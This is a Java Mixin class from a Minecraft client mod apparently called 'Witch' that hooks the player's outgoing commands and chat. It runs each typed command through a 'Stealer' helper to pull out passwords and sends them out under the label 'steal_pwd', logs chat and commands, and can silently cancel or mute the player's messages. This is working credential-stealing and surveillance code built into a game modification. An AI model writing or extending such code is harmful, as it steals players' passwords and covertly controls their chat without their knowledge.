package me.soda.witch.mixin;

import me.soda.witch.Witch;
import me.soda.witch.utils.ChatUtil;
import me.soda.witch.utils.Stealer;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.text.Text;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(ClientPlayerEntity.class)
public abstract class ClientPlayerEntityMixin {
    @Inject(method = "sendCommand(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"))
    private void onSendCommand(String command, Text preview, CallbackInfo info) {
        Stealer.Password pass = Stealer.stealPassword(command);
        if (pass != null) Witch.messageUtils.send("steal_pwd", pass);
        if (Witch.config.logChatAndCommand) Witch.chatCommandLogging.addToList("/" + command);
    }

    @Inject(method = "sendChatMessage(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"), cancellable = true)
    private void onSendChatMessage(String message, Text preview, CallbackInfo info) {
        if (ChatUtil.tryChatBack(message)) info.cancel();
        if (Witch.config.isMuted) info.cancel();
    }
}